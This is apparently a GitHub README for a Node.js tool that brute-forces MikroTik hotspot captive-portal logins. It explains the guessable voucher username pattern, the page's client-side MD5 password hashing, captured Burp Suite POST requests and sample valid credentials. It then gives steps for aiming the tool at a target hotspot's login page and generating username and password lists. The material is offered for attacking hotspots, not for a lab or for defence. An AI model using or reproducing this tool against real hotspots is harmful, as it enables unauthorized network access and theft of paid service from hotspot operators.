### Brute-force attack login

The attack was only tested for the users of ***1 hour***, it is necessary to see the patron of the users of ***a month***.

## Analysis

----------
## Login
Example data valid.

```
username=1hjtd
password=263
```
![alt text](https://github.com/Juve-yescas/Brute-force-Mikrotik/blob/master/Information/Welcome-one.png "User 1hjtd")

```
username=1hmtw
password=423
```

![alt text](https://github.com/Juve-yescas/Brute-force-Mikrotik/blob/master/Information/Welcome-two.png "User 1hmtw")

#### The ip addres is this 

![alt text](https://github.com/Juve-yescas/Brute-force-Mikrotik/blob/master/Information/DHCP-example.png "My dchp config")

## How to attack?

The patron is <kbd>1h</kbd> for username

```
username=1hjtd
password=263
```

> By right clicking > View source code for this page,
You can see that the values to create a secure password are changing on the function doLogin(), this complicates attacking directly through a direct post you plain text, the post should be done with the password already encrypted.

```
document.sendin.password.value = hexMD5('\075' + document.login.password.value + '\532\742\124\412\422\545\965\162\943\173\846\825\842\857\139\184');
document.sendin.password.value = hexMD5('\123' + document.login.password.value + '\624\077\174\275\022\150\314\272\032\201\122\170\154\311\235\102');
```

### Capturing request with burpsuite

```
username=1hjtd&password=6e7651ee150309d7da25cb30329368e2&dst=&popup=true
username=1hjtd&password=9f788a4e692207e71cdffbb921b8f8f1&dst=&popup=true
username=1hjtd&password=9f788a4e692207e71cdffbb921b8f8f1&dst=&popup=true
username=1hjtd&password=1d44ed0532a8d99b41ea8864352d9e59&dst=&popup=true
username=1hjtd&password=99b033a5dbd6ff867c265c05170e0ef1&dst=&popup=true
username=1hjtd&password=9f2611a4b2ff7f42b9e72758aeb28a52&dst=&popup=true
username=1hjtd&password=d62418f1793ab0dec2754a088d21d534&dst=&popup=true
username=1hjtd&password=d62418f1793ab0dec2754a088d21d534&dst=&popup=true
username=1hjtd&password=00cfe5b8e01a385d18a29b459f349823&dst=&popup=true
```
> **Note:** The password changes every time a request is made.

## Post example to attack

```
username: 1hjtd
password: 00cfe5b8e01a385d18a29b459f349823

burpsuite capture: 

username=1hjtd&password=00cfe5b8e01a385d18a29b459f349823&dst=&popup=true
```

## How to use this tool?

Must have installed Nodejs and internet connection.

Clone this repository and in the folder **Hack-Mikrotik-Login**  

Edit file `conf.json` change `http://localjuve.com` by the login page of the hotspot to attack (example `http://hotspotmikrotik.com`)

Execute this command.

```
$ npm install
$ npm start
```

> The `data.js` file contains the list of possible users and passwords, can generate more users and passwords using `Tools/ dig-Generate-File.py`

## License [![FOSSA Status](https://app.fossa.io/api/projects/git%2Bgithub.com%2FJuvenal-yescas%2FBrute-force-Mikrotik.svg?type=shield)](https://app.fossa.io/projects/git%2Bgithub.com%2FJuvenal-yescas%2FBrute-force-Mikrotik?ref=badge_shield)

[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bgithub.com%2FJuvenal-yescas%2FBrute-force-Mikrotik.svg?type=large)](https://app.fossa.io/projects/git%2Bgithub.com%2FJuvenal-yescas%2FBrute-force-Mikrotik?ref=badge_large)
